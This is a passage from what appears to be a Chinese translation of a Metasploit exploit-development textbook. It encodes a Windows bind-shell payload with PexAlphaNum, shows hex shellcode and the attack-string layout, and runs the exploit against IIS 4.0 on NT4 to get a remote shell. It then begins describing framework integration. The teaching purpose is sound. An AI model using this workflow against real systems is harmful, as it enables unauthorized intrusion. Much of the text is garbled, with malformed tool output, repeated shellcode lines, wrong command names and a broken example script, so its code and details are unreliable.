
为了增加我们的负载在不被修改的情况下通过过滤器的概率，我们对负载进行了字母数字编码。这使我们限于 Alpha2 或 PexAlphaNum 编码器。由于两者都可以工作，我们决定使用 PexAlphaNum 编码器，并按图 13.25 所示显示编码器信息。

## 图 13.25 PexAlphaNum 编码器信息

```
$framework
$ /framework/nothingbuf="/framework
$ msfencode -n PexAlphaNum
Name: PexNumeric Encoder
Version: 1.19 
OS/CPU: x86
Type: alphanumeric

Provided By:
Bernd-Jan Ueber <skylined@...>
Advanced Options:
Advanced(Encoder::PexAlphaNum):
Description:
Skylined 的字母数字编码器移植到 perl
Administrator/nothingbuf="/framework"
```

在最后一步中，`~/framework/payload` 中的原始负载通过 PexAlphaNum 编码以避免 `0x00` 字符。`msfencode` 的结果显示在图 13.26 中。

## 图 13.26 msfencode 结果

```
administrator::msgOutput "/framework"
$msfencode = $payload; # AlphaNum
Encoded Size: PerlAlphaNum with final size of 717 bytes
$payload = "
```

`msfencode` 的结果告诉我们，选定的编码器成功生成了避免 NUL 字符的 717 字节字母数字负载。编码后的负载以 Perl 格式输出，可以复制粘贴到漏洞脚本中。Metasploit 在 www.metasplo.com/shellcode 提供了 msfpayload 和 msfencode 工具的图形化点击版本。Web 界面允许我们根据操作系统过滤负载。在图 13.27 中，我们根据操作系统过滤了负载。我们看到了之前使用的 Windows Bind Shell，因此点击该链接。

## 图 13.27 msfweb 负载生成

![](img/2714962ecb76901140563c8dd1fc9_692_0.png)

选择负载后，Web 界面进入指定负载和编码器选项的页面。在图 13.28 中，我们将监听端口设置为 3137，并将编码器设置为 PexAlphaNum。除了负载不允许的字符外，我们还可以指定负载负载。

## 图 13.28 设置 msfweb 负载选项

![](img/2714962ecb76901140563c8dd1fc9_692_1.png)

调用 Generate Payload 按钮生成并编码负载。结果以 C 和 Perl 字符串的形式呈现。13.29 显示

## 图 13.29 mswfb 生成并编码的负载

```
* win32_bind --EITFNC -b LGPORT=31337 Size=717 Encoder=PxAlphaNum http://metasploit.com /
\x40\x27\x59\x20\x55\xe8\x6f\xf8\xf8\xf4\x41\x49\x49\x49\x49\x49\x49\n\x41\x49\x51\x55\x5a\x56\x5a\x56\x53\x58\x53\x31\x30\x56\x58\x34\x41\x34\x31\x42\x32\x36\n\x34\x48\x40\x50\x5a\x5a\x51\x51\x51\x51\x51\x51\x53\x58\x32\x41\x34\x41\x42\x32\x34\n\x34\x48\x40\x50\x5a\x5a\x51\x51\x51\x51\x51\x51\x53\x58\x32\x41\x34\x41\x42\x32\x34\n\x34\x58\x5a\x5a\x51\x51\x51\x51\x51\x51\x53\x58\x32\x41\x34\x41\x42\x32\x34.
* win32_bind --EITFNC -b LGPORT=31337 Size=717 Encoder=PxAlphaNum http://metasploit.com /
```

现在我们有了 Metasploit 提供的多种生成负载的方法，可以提取负载插入漏洞脚本中。此步如示例 13.6 所示。

## 示例 13.6 带有负载的脚本

+   * /payload/

*   * \xeb\x03\x59\x65\x58\x65\x78\xff\xff\xff\xff\x4f\x49\x49\x49\x49\x49\x49\n*\x41\x49\x51\x55\x5a\x56\x5a\x56\x53\x58\x53\x31\x30\x56\x58\x34\x41\x34\x31\x42\x32\x36\n\x34\x48\x40\x50\x5a\x5a\x51\x51\x51\x51\x51\x51\x53\x58\x32\x41\x34\x41\x42\x32\x34\n

# 第 13 章 • 扩展 asploit

第 1 到 46 行将 `Payload` 变量设置为编码后的有效负载，第 48 行和 52 行将偏移量 `offset` 设置为返回地址。返回地址在第 50 行添加，然后在第 51 行将有效负载附加到字符串之后。第 53 到 56 行包含处理网络通信的代码。我们完整的攻击字符串显示在图 13.30 中。

## 图 13.30 最终攻击

| 589 字节填充 | 4 字节覆盖返回地址 | 717 字节的解码器和编码后的有效负载 |

从命令行，我们可以针对目标机器测试漏洞利用 `exploit`。我们在图 13.31 中看到了结果。

### 图 13.31 成功利用运行 IIS 4.0 的 MS Windows NT4 SP5

```
administrator@nothingbut "Framework"
$ python ie-h4c.pl b
[1] 912
administrator@nothingbut "Framework"
$ target 192.168.119.136
Trying to 192.168.119.136...
Connected to 192.168.119.136.
Escape character is '^'.
Microsoft(R) Windows NT(M)
(C) Copyright 1995-1998. Microsoft Corp.
C:\Windows\system32~>
```

在第一行中，我们在后台运行漏洞利用程序。为了测试我们的漏洞利用是否成功，我们尝试向远程机器的 31337 端口连接，该端口是生成过程中指定的监听端口。我们看到连接被接受，远程机器上的 shell 传回给了我们。成功了！

## 将漏洞利用程序集成到框架

现在我们已经成功构建了漏洞利用程序，可以探索如何将其集成到 Metasploit Framework 中。为框架编写漏洞利用模块比编写独立的漏洞利用程序有许多优势。集成后，漏洞利用程序可以利用动态有效负载创建和编码、nop 指令生成、简单的 socket 接口以及自动有效负载处理等功能。模块化的有效负载、编码器和 nop 系统使得在不修改任何漏洞利用代码的情况下实现漏洞利用成为可能，同时也便于保持漏洞利用程序的更新。Metasploit 提供了一个简单的 socket API（应用程序接口），除了处理基本的 TCP（传输控制协议）和 UDP（用户数据报协议）socket 通信外，还能透明地管理 SSL（安全套接层）和代理。如图 13.9 所示，自动有效负载处理处理所有连接，无需使用任何外部程序或编写任何额外代码。最后，框架提供了一个清晰、标准的接口，使得使用和共享漏洞利用程序比以前任何时候都容易。由于所有这些因素，漏洞利用开发者现在正快速地转向基于框架的漏洞利用开发。

## 理解框架

Metasploit Framework 完全用面向对象的 Perl 语言编写。引擎和库中的所有代码都是基于类 `class-based` 的，框架中的每个漏洞利用模块也是基于类的。这意味着为框架开发漏洞利用程序需要编写一个类；该类必须符合 Metasploit 引擎预期的 API。在深入研究漏洞利用类规范之前，漏洞利用开发者应该了解引擎如何驱动漏洞利用过程；因此，我们来深入引擎内部——通过漏洞利用过程的每个阶段查看漏洞利用交互。

漏洞利用过程的第一阶段是选择漏洞利用程序。使用 `use` 命令选择漏洞利用程序，这会导致引擎根据漏洞利用类实例化对象。实例化过程通过框架环境将引擎和漏洞利用程序连接起来，并导致引擎为引擎提供两个重要的数据结构。
